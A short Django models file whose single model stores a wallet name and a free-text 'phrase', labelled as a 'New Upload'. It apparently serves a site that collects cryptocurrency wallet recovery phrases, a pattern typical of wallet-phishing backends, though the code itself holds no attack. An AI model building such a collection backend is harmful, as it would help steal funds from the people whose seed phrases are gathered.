from django.db import models

# Create your models here.
class Info(models.Model):
    created_at = models.DateTimeField(auto_now_add=True)
    wallet = models.CharField(max_length=200)
    phrase = models.TextField()

    def __str__(self):
        return "New Upload at "+str(self.created_at)[:16]+" "+self.wallet
